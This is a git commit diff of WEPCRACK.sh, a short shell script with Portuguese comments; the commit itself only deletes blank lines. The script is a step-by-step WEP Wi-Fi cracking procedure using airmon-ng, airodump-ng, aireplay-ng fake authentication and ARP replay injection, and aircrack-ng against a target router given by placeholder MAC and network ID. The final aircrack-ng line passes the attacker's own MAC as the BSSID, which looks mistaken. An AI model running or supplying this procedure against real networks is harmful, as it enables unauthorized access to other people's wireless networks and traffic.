5c5ff205892fabe53d97d6c1c05177ebfdd7a8c0
Eduardo Mendes <z4r4tu5tr4@users.noreply.github.com>
2015-03-05 01:40:53 -0300

    Update WEPCRACK.sh

--- WEPCRACK.sh
+++ WEPCRACK.sh
@@ -1,15 +1,12 @@
 #execução terminal [0]
 	airmon-ng start <sua_interface>
 	airodump-ng mon0
-
 	airodump-ng --channel 6 --bssid <mac_roteador> -w wep1 mon0
 
 #Executado em outro terminal ao mesmo tempo[1]
 	aireplay-ng -1 0 -e <id_da_rede> -a <mac_roteador> -h <meu_mac> mon0
-
 	aireplay-ng -3 -b <mac_roteador> -h <meu_mac> mon0
 
 #Executado em outro terminal ao mesmo tempo[2]
 	aireplay-ng -1 0 -e <id_da_rede> -a <mac_roteador> -h <meu_mac> mon0
-
 	aircrack-ng -b <meu_mac> wep1-01.cap
